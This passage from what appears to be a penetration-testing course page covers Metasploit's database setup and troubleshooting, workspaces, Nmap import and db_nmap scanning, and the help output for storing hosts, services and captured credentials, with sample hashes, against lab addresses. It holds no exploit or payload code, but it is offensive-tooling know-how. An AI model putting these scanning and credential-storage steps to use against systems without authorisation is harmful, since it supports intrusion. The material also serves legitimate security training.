[+] Creating database user <span class="hljs-string">'msf'</span>
[+] Creating databases <span class="hljs-string">'msf'</span>
[+] Creating databases <span class="hljs-string">'msf_test'</span>
[+] Creating configuration file <span class="hljs-string">'/usr/share/metasploit-framework/config/database.yml'</span>
[+] Creating initial database schema
rake aborted!
NoMethodError: undefined <span class="hljs-function"><span class="hljs-keyword">method</span> `<span class="hljs-title">without</span>' <span class="hljs-title">for</span> #&lt;<span class="hljs-title">Bundler</span>:</span>:Settings:<span class="hljs-number">0</span>x000055dddcf8cba8&gt;
Did you mean? with_options

&lt;SNIP&gt;
</code></pre>
<p>Sometimes an error can occur if Metasploit is not up to date. This difference that causes the error can happen for several reasons. First, often it helps to update Metasploit again (<code>apt update</code>) to solve this problem. Then we can try to reinitialize the MSF database.</p>
<p>Databases</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ sudo msfdb init

<span class="hljs-string">[i]</span> Database already started
<span class="hljs-string">[i]</span> The database appears to be already configured, skipping initialization
</code></pre>
<p>If the initialization is skipped and Metasploit tells us that the database is already configured, we can recheck the status of the database.</p>
<p>Databases</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ sudo msfdb status

● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib</span><span class="hljs-regexp">/systemd/system</span><span class="hljs-regexp">/postgresql.service; disabled; vendor preset: disabled)
     Active: active (exited) since Mon 2022-05-09 15:19:57 BST; 35min ago
    Process: 2476 ExecStart=/bin</span><span class="hljs-regexp">/true (code=exited, status=0/</span>SUCCESS)
   Main <span class="hljs-symbol">PID:</span> <span class="hljs-number">2476</span> (code=exited, status=<span class="hljs-number">0</span>/SUCCESS)
        <span class="hljs-symbol">CPU:</span> <span class="hljs-number">1</span>ms

May <span class="hljs-number">09</span> <span class="hljs-number">15</span>:<span class="hljs-number">19</span>:<span class="hljs-number">57</span> pwnbox-base systemd[<span class="hljs-number">1</span>]: Starting PostgreSQL RDBMS...
May <span class="hljs-number">09</span> <span class="hljs-number">15</span>:<span class="hljs-number">19</span>:<span class="hljs-number">57</span> pwnbox-base systemd[<span class="hljs-number">1</span>]: Finished PostgreSQL RDBMS.

COMMAND   PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
postgres <span class="hljs-number">2458</span> postgres    <span class="hljs-number">5</span>u  IPv6  <span class="hljs-number">34336</span>      <span class="hljs-number">0</span>t0  TCP <span class="hljs-symbol">localhost:</span><span class="hljs-number">5432</span> (LISTEN)
postgres <span class="hljs-number">2458</span> postgres    <span class="hljs-number">6</span>u  IPv4  <span class="hljs-number">34337</span>      <span class="hljs-number">0</span>t0  TCP <span class="hljs-symbol">localhost:</span><span class="hljs-number">5432</span> (LISTEN)

UID          PID    PPID  C STIME TTY      STAT   TIME CMD
postgres    <span class="hljs-number">2458</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span> <span class="hljs-number">15</span>:<span class="hljs-number">19</span> ?        Ss     <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">postgresql</span>/13/<span class="hljs-title">bin</span>/<span class="hljs-title">postgres</span> -<span class="hljs-title">D</span> /<span class="hljs-title">var</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">postgresql</span>/13/<span class="hljs-title">main</span> -<span class="hljs-title">c</span> <span class="hljs-title">con</span></span>

[+] Detected configuration file (<span class="hljs-regexp">/usr/share</span><span class="hljs-regexp">/metasploit-framework/config</span><span class="hljs-regexp">/database.yml)</span>
</code></pre>
<p>If this error does not appear, which often happens after a fresh installation of Metasploit, then we will see the following when initializing the database:</p>
<p>Databases</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo msfdb init

[+] <span class="hljs-symbol">Starting</span> database
[+] <span class="hljs-symbol">Creating</span> database user <span class="hljs-string">'msf'</span>
[+] <span class="hljs-symbol">Creating</span> databases <span class="hljs-string">'msf'</span>
[+] <span class="hljs-symbol">Creating</span> databases <span class="hljs-string">'msf_test'</span>
[+] <span class="hljs-symbol">Creating</span> configuration file <span class="hljs-string">'/usr/share/metasploit-framework/config/database.yml'</span>
[+] <span class="hljs-symbol">Creating</span> initial database schema
</code></pre>
<p>After the database has been initialized, we can start <code>msfconsole</code> and connect to the created database simultaneously.</p>
<p><strong>MSF - Connect to the Initiated Database</strong></p>
<p>Databases</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo msfdb <span class="hljs-keyword">run</span>

[i] Database already started

         .                                         .
 .

      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       '   <span class="hljs-keyword">dB</span>'                     BBP
    <span class="hljs-keyword">dB</span>'<span class="hljs-keyword">dB</span>'<span class="hljs-keyword">dB</span>' dBBP     dBP     dBP BB
   <span class="hljs-keyword">dB</span>'<span class="hljs-keyword">dB</span>'<span class="hljs-keyword">dB</span>' dBP      dBP     dBP  BB
  <span class="hljs-keyword">dB</span>'<span class="hljs-keyword">dB</span>'<span class="hljs-keyword">dB</span>' dBBBBP   dBP     dBBBBBBB

                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  <span class="hljs-keyword">dB</span>' dBP    <span class="hljs-keyword">dB</span>'.BP
                             |       dBP    dBBBB' dBP    <span class="hljs-keyword">dB</span>'.BP dBP    dBP
                           --o--    dBP    dBP    dBP    <span class="hljs-keyword">dB</span>'.BP dBP    dBP
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP

                                                                    .
                .
        o                  To boldly go where <span class="hljs-keyword">no</span>
                            <span class="hljs-keyword">shell</span> has gone before


       =[ metasploit v6.1.39-dev                          ]
+ -- --=[ 2214 exploits - 1171 auxiliary - 396 <span class="hljs-keyword">post</span>       ]
+ -- --=[ 616 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

msf6&gt;
</code></pre>
<p>If, however, we already have the database configured and are not able to change the password to the MSF username, proceed with these commands:</p>
<p><strong>MSF - Reinitiate the Database</strong></p>
<p>Databases</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ msfdb reinit
root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ cp /</span>usr<span class="hljs-regexp">/share/</span>metasploit-framework<span class="hljs-regexp">/config/</span>database.yml <span class="hljs-regexp">~/.msf4/</span>
root<span class="hljs-meta">@htb</span>[/htb]$ sudo service postgresql restart
root<span class="hljs-meta">@htb</span>[/htb]$ msfconsole -q

msf6 &gt; db_status

[*] Connected to msf. Connection <span class="hljs-string">type:</span> PostgreSQL.
</code></pre>
<p>Now, we are good to go. The <code>msfconsole</code> also offers integrated help for the database. This gives us a good overview of interacting with and using the database.</p>
<p><strong>MSF - Database Options</strong></p>
<p>Databases</p>
<pre><code class="lang-shell-session">msf6 &gt; help database

Database Backend Commands
=========================

    Command           Description
    -------           -----------
    db_connect        Connect <span class="hljs-keyword">to</span> an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         <span class="hljs-keyword">Import</span> a scan result file (filetype will be auto<span class="hljs-params">-detected</span>)
    db_nmap           Executes nmap <span class="hljs-literal">and</span> <span class="hljs-keyword">records</span> the output automatically
    db_rebuild_cache  Rebuilds the database<span class="hljs-params">-stored</span> module <span class="hljs-keyword">cache</span>
    db_status         Show the current database status
    hosts             <span class="hljs-built_in">List</span> <span class="hljs-literal">all</span> hosts <span class="hljs-keyword">in</span> the database
    loot              <span class="hljs-built_in">List</span> <span class="hljs-literal">all</span> loot <span class="hljs-keyword">in</span> the database
    notes             <span class="hljs-built_in">List</span> <span class="hljs-literal">all</span> notes <span class="hljs-keyword">in</span> the database
    services          <span class="hljs-built_in">List</span> <span class="hljs-literal">all</span> services <span class="hljs-keyword">in</span> the database
    vulns             <span class="hljs-built_in">List</span> <span class="hljs-literal">all</span> vulnerabilities <span class="hljs-keyword">in</span> the database
    workspace         Switch between database workspaces


msf6 &gt; db_status

<span class="hljs-meta">[</span>*<span class="hljs-meta">]</span> Connected to msf. Connection type: postgresql.
</code></pre>
<hr>
<h3 id="using-the-database">Using the Database</h3>
<p>With the help of the database, we can manage many different categories and hosts that we have analyzed. Alternatively, the information about them that we have interacted with using Metasploit. These databases can be exported and imported. This is especially useful when we have extensive lists of hosts, loot, notes, and stored vulnerabilities for these hosts. After confirming that the database is successfully connected, we can organize our <code>Workspaces</code>.</p>
<p><strong>Workspaces</strong></p>
<p>We can think of <code>Workspaces</code> the same way we would think of folders in a project. We can segregate the different scan results, hosts, and extracted information by IP, subnet, network, or domain.</p>
<p>To view the current Workspace list, use the <code>workspace</code> command. Adding a <code>-a</code> or <code>-d</code> switch after the command, followed by the workspace&#39;s name, will either <code>add</code> or <code>delete</code> that workspace to the database.</p>
<p>Databases</p>
<pre><code class="lang-shell-session"><span class="hljs-title">msf6</span> &gt; workspace

* <span class="hljs-keyword">default</span>
</code></pre>
<p>Notice that the default Workspace is named <code>default</code> and is currently in use according to the <code>*</code> symbol. Type the <code>workspace [name]</code> command to switch the presently used workspace. Looking back at our example, let us create a workspace for this assessment and select it.</p>
<p>Databases</p>
<pre><code class="lang-shell-session">msf6 &gt; <span class="hljs-keyword">workspace</span> -a Target_1

[*] Added <span class="hljs-keyword">workspace</span>: Target_1
[*] Workspace: Target_1


msf6 &gt; <span class="hljs-keyword">workspace</span> Target_1 

[*] Workspace: Target_1


msf6 &gt; <span class="hljs-keyword">workspace</span>

  <span class="hljs-keyword">default</span>
* Target_1
</code></pre>
<p>To see what else we can do with Workspaces, we can use the <code>workspace -h</code> command for the help menu related to Workspaces.</p>
<p>Databases</p>
<pre><code class="lang-shell-session">msf6 &gt; <span class="hljs-keyword">workspace</span> -h

Usage:
    <span class="hljs-keyword">workspace</span>                  List workspaces
    <span class="hljs-keyword">workspace</span> -v               List workspaces verbosely
    <span class="hljs-keyword">workspace</span> [name]           Switch <span class="hljs-keyword">workspace</span>
    <span class="hljs-keyword">workspace</span> -a [name] ...    Add <span class="hljs-keyword">workspace</span>(s)
    <span class="hljs-keyword">workspace</span> -d [name] ...    Delete <span class="hljs-keyword">workspace</span>(s)
    <span class="hljs-keyword">workspace</span> -D               Delete all workspaces
    <span class="hljs-keyword">workspace</span> -r     Rename <span class="hljs-keyword">workspace</span>
    <span class="hljs-keyword">workspace</span> -h               Show this <span class="hljs-keyword">help</span> information
</code></pre>
<hr>
<h3 id="importing-scan-results">Importing Scan Results</h3>
<p>Next, let us assume we want to import a <code>Nmap scan</code> of a host into our Database&#39;s Workspace to understand the target better. We can use the <code>db_import</code> command for this. After the import is complete, we can check the presence of the host&#39;s information in our database by using the <code>hosts</code> and <code>services</code> commands. Note that the <code>.xml</code> file type is preferred for <code>db_import</code>.</p>
<p><strong>Stored Nmap Scan</strong></p>
<p>Databases</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-keyword">cat</span> Target.nmap

Starting Nmap 7.80 ( https:<span class="hljs-comment">//nmap.org ) at 2020-08-17 20:54 UTC</span>
Nmap scan <span class="hljs-keyword">report</span> <span class="hljs-keyword">for</span> 10.10.10.40
Host is up (0.017s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      <span class="hljs-keyword">VERSION</span>
135/tcp   <span class="hljs-keyword">open</span>  msrpc        Microsoft Windows RPC
139/tcp   <span class="hljs-keyword">open</span>  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   <span class="hljs-keyword">open</span>  microsoft-<span class="hljs-keyword">ds</span> Microsoft Windows 7 - 10 microsoft-<span class="hljs-keyword">ds</span> (workgroup: WORKGROUP)
49152/tcp <span class="hljs-keyword">open</span>  msrpc        Microsoft Windows RPC
49153/tcp <span class="hljs-keyword">open</span>  msrpc        Microsoft Windows RPC
49154/tcp <span class="hljs-keyword">open</span>  msrpc        Microsoft Windows RPC
49155/tcp <span class="hljs-keyword">open</span>  msrpc        Microsoft Windows RPC
49156/tcp <span class="hljs-keyword">open</span>  msrpc        Microsoft Windows RPC
49157/tcp <span class="hljs-keyword">open</span>  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please <span class="hljs-keyword">report</span> any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span>
Nmap done: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 60.81 seconds
</code></pre>
<p><strong>Importing Scan Results</strong></p>
<p>Databases</p>
<pre><code class="lang-shell-session">msf6 &gt; db_import Target.xml

[*] Importing <span class="hljs-string">'Nmap XML'</span> data
[*] Import: Parsing with <span class="hljs-string">'Nokogiri v1.10.9'</span>
[*] Importing host <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>
[*] Successfully imported ~/Target.xml


msf6 &gt; hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>             Unknown                    device         


msf6 &gt; services

Services
========

host         port   proto  name          state  info
----         ----   -----  ----          -----  ----
<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>  <span class="hljs-number">135</span>    tcp    msrpc         open   Microsoft Windows RPC
<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>  <span class="hljs-number">139</span>    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>  <span class="hljs-number">445</span>    tcp    microsoft-<span class="hljs-built_in">ds</span>  open   Microsoft Windows <span class="hljs-number">7</span> - <span class="hljs-number">10</span> microsoft-<span class="hljs-built_in">ds</span> workgroup: WORKGROUP
<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>  <span class="hljs-number">49152</span>  tcp    msrpc         open   Microsoft Windows RPC
<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>  <span class="hljs-number">49153</span>  tcp    msrpc         open   Microsoft Windows RPC
<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>  <span class="hljs-number">49154</span>  tcp    msrpc         open   Microsoft Windows RPC
<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>  <span class="hljs-number">49155</span>  tcp    msrpc         open   Microsoft Windows RPC
<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>  <span class="hljs-number">49156</span>  tcp    msrpc         open   Microsoft Windows RPC
<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>  <span class="hljs-number">49157</span>  tcp    msrpc         open   Microsoft Windows RPC
</code></pre>
<hr>
<h3 id="using-nmap-inside-msfconsole">Using Nmap Inside MSFconsole</h3>
<p>Alternatively, we can use Nmap straight from msfconsole! To scan directly from the console without having to background or exit the process, use the <code>db_nmap</code> command.</p>
<p><strong>MSF - Nmap</strong></p>
<p>Databases</p>
<pre><code class="lang-shell-session">msf6 &gt; db_nmap -sV -<span class="hljs-built_in">sS</span> <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.8</span>

[*] Nmap: Starting Nmap <span class="hljs-number">7.80</span> ( https://nmap.org ) <span class="hljs-meta">at</span> <span class="hljs-number">2020</span>-<span class="hljs-number">08</span>-<span class="hljs-number">17</span> <span class="hljs-number">21</span>:<span class="hljs-number">04</span> UTC
[*] Nmap: Nmap scan report for <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.8</span>
[*] Nmap: Host is <span class="hljs-meta">up</span> (<span class="hljs-number">0.</span>016s latency).
[*] Nmap: <span class="hljs-keyword">Not</span> shown: <span class="hljs-number">999</span> filtered ports
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: <span class="hljs-number">80</span>/TCP open  http    HttpFileServer httpd <span class="hljs-number">2.3</span>
[*] Nmap: Service Info: OS: Windows<span class="hljs-comment">; CPE: cpe:/o:microsoft:windows</span>
[*] Nmap: Service detection performed. Please report any incorrect results <span class="hljs-meta">at</span> https://nmap.org/submit/ 
[*] Nmap: Nmap done: <span class="hljs-number">1</span> <span class="hljs-built_in">IP</span> address (<span class="hljs-number">1</span> host <span class="hljs-meta">up</span>) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">11.12</span> seconds


msf6 &gt; hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.8</span>              Unknown                    device         
<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>             Unknown                    device         


msf6 &gt; services

Services
========

host         port   proto  name          state  info
----         ----   -----  ----          -----  ----
<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.8</span>   <span class="hljs-number">80</span>     tcp    http          open   HttpFileServer httpd <span class="hljs-number">2.3</span>
<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>  <span class="hljs-number">135</span>    tcp    msrpc         open   Microsoft Windows RPC
<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>  <span class="hljs-number">139</span>    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>  <span class="hljs-number">445</span>    tcp    microsoft-<span class="hljs-built_in">ds</span>  open   Microsoft Windows <span class="hljs-number">7</span> - <span class="hljs-number">10</span> microsoft-<span class="hljs-built_in">ds</span> workgroup: WORKGROUP
<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>  <span class="hljs-number">49152</span>  tcp    msrpc         open   Microsoft Windows RPC
<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>  <span class="hljs-number">49153</span>  tcp    msrpc         open   Microsoft Windows RPC
<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>  <span class="hljs-number">49154</span>  tcp    msrpc         open   Microsoft Windows RPC
<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>  <span class="hljs-number">49155</span>  tcp    msrpc         open   Microsoft Windows RPC
<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>  <span class="hljs-number">49156</span>  tcp    msrpc         open   Microsoft Windows RPC
<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>  <span class="hljs-number">49157</span>  tcp    msrpc         open   Microsoft Windows RPC
</code></pre>
<hr>
<h3 id="data-backup">Data Backup</h3>
<p>After finishing the session, make sure to back up our data if anything happens with the PostgreSQL service. To do so, use the <code>db_export</code> command.</p>
<p><strong>MSF - DB Export</strong></p>
<p>Databases</p>
<pre><code class="lang-shell-session">msf6 &gt; db_export -h

Usage:
    db_export -f <span class="hljs-tag">&lt;format&gt;</span> [filename]
    Format can be one of: xml, pwdump
[-] No output file was specified


msf6 &gt; db_export -f <span class="hljs-keyword">xml</span> <span class="hljs-title">backup</span>.<span class="hljs-keyword">xml</span>

<span class="hljs-title">[*] Starting</span> export of workspace default to backup.<span class="hljs-keyword">xml</span> <span class="hljs-title">[ xml</span> ]...
[*] Finished export of workspace default to backup.<span class="hljs-keyword">xml</span> <span class="hljs-title">[ xml</span> ]...
</code></pre>
<p>This data can be imported back to msfconsole later when needed. Other commands related to data retention are the extended use of <code>hosts</code>, <code>services</code>, and the <code>creds</code> and <code>loot</code> commands.</p>
<hr>
<h3 id="hosts">Hosts</h3>
<p>The <code>hosts</code> command displays a database table automatically populated with the host addresses, hostnames, and other information we find about these during our scans and interactions. For example, suppose <code>msfconsole</code> is linked with scanner plugins that can perform service and OS detection. In that case, this information should automatically appear in the table once the scans are completed through msfconsole. Again, tools like Nessus, NexPose, or Nmap will help us in these cases.</p>
<p>Hosts can also be manually added as separate entries in this table. After adding our custom hosts, we can also organize the format and structure of the table, add comments, change existing information, and more.</p>
<p><strong>MSF - Stored Hosts</strong></p>
<p>Databases</p>
<pre><code class="lang-shell-session">msf6 &gt; hosts -h

Usage: hosts [ options ] [addr1 addr2 ...]

OPTIONS:
  -a,<span class="hljs-comment">--add          Add the hosts instead of searching</span>
  -d,<span class="hljs-comment">--delete       Delete the hosts instead of searching</span>
  -c &lt;col1,col2&gt;    Only show <span class="hljs-keyword">the</span> <span class="hljs-keyword">given</span> columns (see <span class="hljs-built_in">list</span> <span class="hljs-keyword">below</span>)
  -C &lt;col1,col2&gt;    Only show <span class="hljs-keyword">the</span> <span class="hljs-keyword">given</span> columns <span class="hljs-keyword">until</span> <span class="hljs-keyword">the</span> next restart (see <span class="hljs-built_in">list</span> <span class="hljs-keyword">below</span>)
  -h,<span class="hljs-comment">--help         Show this help information</span>
  -u,<span class="hljs-comment">--up           Only show hosts which are up</span>
  -o &lt;<span class="hljs-built_in">file</span>&gt;         Send output <span class="hljs-keyword">to</span> a <span class="hljs-built_in">file</span> <span class="hljs-keyword">in</span> CSV format
  -O &lt;column&gt;       Order rows <span class="hljs-keyword">by</span> specified column <span class="hljs-built_in">number</span>
  -R,<span class="hljs-comment">--rhosts       Set RHOSTS from the results of the search</span>
  -S,<span class="hljs-comment">--search       Search string to filter by</span>
  -i,<span class="hljs-comment">--info         Change the info of a host</span>
  -n,<span class="hljs-comment">--name         Change the name of a host</span>
  -m,<span class="hljs-comment">--comment      Change the comment of a host</span>
  -t,<span class="hljs-comment">--tag          Add or specify a tag to a range of hosts</span>

Available columns: address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, <span class="hljs-built_in">name</span>, note_count, os_family, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count, tags
</code></pre>
<hr>
<h3 id="services">Services</h3>
<p>The <code>services</code> command functions the same way as the previous one. It contains a table with descriptions and information on services discovered during scans or interactions. In the same way as the command above, the entries here are highly customizable.</p>
<p><strong>MSF - Stored Services of Hosts</strong></p>
<p>Databases</p>
<pre><code class="lang-shell-session">msf6 &gt; services -h

Usage: services [-h] [-u] [-<span class="hljs-keyword">a</span>] [-r &lt;proto&gt;] [-p &lt;port1,port2&gt;] [-s &lt;name1,name2&gt;] [-o &lt;filename&gt;] [addr1 addr2 ...]

  -<span class="hljs-keyword">a</span>,<span class="hljs-comment">--add          Add the services instead of searching</span>
  -d,<span class="hljs-comment">--delete       Delete the services instead of searching</span>
  -c &lt;col1,col2&gt;    Only show <span class="hljs-keyword">the</span> given columns
  -h,<span class="hljs-comment">--help         Show this help information</span>
  -s &lt;name&gt;         Name <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> service <span class="hljs-built_in">to</span> <span class="hljs-built_in">add</span>
  -p &lt;port&gt;         Search <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> list <span class="hljs-keyword">of</span> ports
  -r &lt;protocol&gt;     Protocol type <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> service being added [tcp|udp]
  -u,<span class="hljs-comment">--up           Only show services which are up</span>
  -o &lt;<span class="hljs-built_in">file</span>&gt;         Send output <span class="hljs-built_in">to</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">file</span> <span class="hljs-keyword">in</span> csv <span class="hljs-built_in">format</span>
  -O &lt;column&gt;       Order rows <span class="hljs-keyword">by</span> specified column <span class="hljs-built_in">number</span>
  -R,<span class="hljs-comment">--rhosts       Set RHOSTS from the results of the search</span>
  -S,<span class="hljs-comment">--search       Search string to filter by</span>
  -U,<span class="hljs-comment">--update       Update data for existing service</span>

Available columns: created_at, info, name, port, proto, state, updated_at
</code></pre>
<hr>
<h3 id="credentials">Credentials</h3>
<p>The <code>creds</code> command allows you to visualize the credentials gathered during your interactions with the target host. We can also add credentials manually, match existing credentials with port specifications, add descriptions, etc.</p>
<p><strong>MSF - Stored Credentials</strong></p>
<p>Databases</p>
<pre><code class="lang-shell-session">msf6 &gt; creds -h

With no sub-<span class="hljs-keyword">command</span>, <span class="hljs-title">list</span> <span class="hljs-title">credentials</span>. <span class="hljs-title">If</span> <span class="hljs-title">an</span> <span class="hljs-title">address</span> <span class="hljs-title">range</span> <span class="hljs-title">is</span>
given, show only credentials <span class="hljs-keyword">with</span> logins <span class="hljs-keyword">on</span> <span class="hljs-title">hosts</span> <span class="hljs-title">within</span> <span class="hljs-title">that</span>
range.

Usage - Listing credentials:
  creds [<span class="hljs-built_in">filter</span> options] [address range]

Usage - Adding credentials:
  creds <span class="hljs-built_in">add</span> uses <span class="hljs-keyword">the</span> following named parameters.
    user      :  Public, usually <span class="hljs-keyword">a</span> username
    password  :  Private, private_type Password.
    ntlm      :  Private, private_type NTLM Hash.
    Postgres  :  Private, private_type Postgres MD5
    ssh-key   :  Private, private_type SSH key, must be <span class="hljs-keyword">a</span> <span class="hljs-built_in">file</span> path.
    hash      :  Private, private_type Nonreplayable hash
    jtr       :  Private, private_type John <span class="hljs-keyword">the</span> Ripper hash type.
    realm     :  Realm, 
    realm-type:  Realm, realm_type (domain db2db sid pgdb rsync wildcard), defaults <span class="hljs-built_in">to</span> domain.

Examples: Adding
   <span class="hljs-comment"># Add a user, password and realm</span>
   creds <span class="hljs-built_in">add</span> user:admin password:notpassword realm:workgroup
   <span class="hljs-comment"># Add a user and password</span>
   creds <span class="hljs-built_in">add</span> user:guest password:<span class="hljs-string">'guest password'</span>
   <span class="hljs-comment"># Add a password</span>
   creds <span class="hljs-built_in">add</span> password:<span class="hljs-string">'password without username'</span>
   <span class="hljs-comment"># Add a user with an NTLMHash</span>
   creds <span class="hljs-built_in">add</span> user:admin ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
   <span class="hljs-comment"># Add a NTLMHash</span>
   creds <span class="hljs-built_in">add</span> ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
   <span class="hljs-comment"># Add a Postgres MD5</span>
   creds <span class="hljs-built_in">add</span> user:postgres postgres:md5be86a79bf2043622d58d5453c47d4860
   <span class="hljs-comment"># Add a user with an SSH key</span>
   creds <span class="hljs-built_in">add</span> user:sshadmin ssh-key:/path/<span class="hljs-built_in">to</span>/id_rsa
   <span class="hljs-comment"># Add a user and a NonReplayableHash</span>
   creds <span class="hljs-built_in">add</span> user:other hash:d19c32489b870735b5f587d76b934283 jtr:md5
   <span class="hljs-comment"># Add a NonReplayableHash</span>
   creds <span class="hljs-built_in">add</span> hash:d19c32489b870735b5f587d76b934283

General options
  -h,<span class="hljs-comment">--help             Show this help information</span>
  -o &lt;<span class="hljs-built_in">file</span>&gt;             Send output <span class="hljs-built_in">to</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">file</span> <span class="hljs-keyword">in</span> csv/jtr (john <span class="hljs-keyword">the</span> ripper) <span class="hljs-built_in">format</span>.
                        If <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> name <span class="hljs-keyword">ends</span> <span class="hljs-keyword">in</span> <span class="hljs-string">'.jtr'</span>, that <span class="hljs-built_in">format</span> will be used.
                        If <span class="hljs-built_in">file</span> name <span class="hljs-keyword">ends</span> <span class="hljs-keyword">in</span> <span class="hljs-string">'.hcat'</span>, <span class="hljs-keyword">the</span> hashcat <span class="hljs-built_in">format</span> will be used.
                        CSV <span class="hljs-keyword">by</span> default.
  -d,<span class="hljs-comment">--delete           Delete one or more credentials</span>

Filter options <span class="hljs-keyword">for</span> listing
  -P,<span class="hljs-comment">--password &lt;text&gt;  List passwords that match this text</span>
  -p,<span class="hljs-comment">--port &lt;portspec&gt;  List creds with logins on services matching this port spec</span>
  -s &lt;svc names&gt;        List creds matching <span class="hljs-literal">comma</span>-separated service names
  -u,<span class="hljs-comment">--user &lt;text&gt;      List users that match this text</span>
  -t,<span class="hljs-comment">--type &lt;type&gt;      List creds that match the following types: password,ntlm,hash</span>
  -O,<span class="hljs-comment">--origins &lt;IP&gt;     List creds that match these origins</span>
  -R,<span class="hljs-comment">--rhosts           Set RHOSTS from the results of the search</span>
  -v,<span class="hljs-comment">--verbose          Don't truncate long password hashes</span>

Examples, John <span class="hljs-keyword">the</span> Ripper hash types:
  Operating Systems (starts <span class="hljs-keyword">with</span>)
    Blowfish ($<span class="hljs-number">2</span><span class="hljs-keyword">a</span>$)   : bf
    BSDi     (_)      : bsdi
    DES               : des,crypt
    MD5      ($<span class="hljs-number">1</span>$)    : md5
    SHA256   ($<span class="hljs-number">5</span>$)    : sha256,crypt
    SHA512   ($<span class="hljs-number">6</span>$)    : sha512,crypt
  Databases
    MSSQL             : mssql
    MSSQL <span class="hljs-number">2005</span>        : mssql05
    MSSQL <span class="hljs-number">2012</span>/<span class="hljs-number">2014</span>   : mssql12
    MySQL &lt; <span class="hljs-number">4.1</span>       : mysql
    MySQL &gt;= <span class="hljs-number">4.1</span>      : mysql-sha1
    Oracle            : des,oracle
    Oracle <span class="hljs-number">11</span>         : raw-sha1,oracle11
    Oracle <span class="hljs-number">11</span> (H type): dynamic_1506
    Oracle <span class="hljs-number">12</span>c        : oracle12c
    Postgres          : postgres,raw-md5

Examples, listing:
  creds               <span class="hljs-comment"># Default, returns all credentials</span>
  creds <span class="hljs-number">1.2</span><span class="hljs-number">.3</span><span class="hljs-number">.4</span>/<span class="hljs-number">24</span>    <span class="hljs-comment"># Return credentials with logins in this range</span>
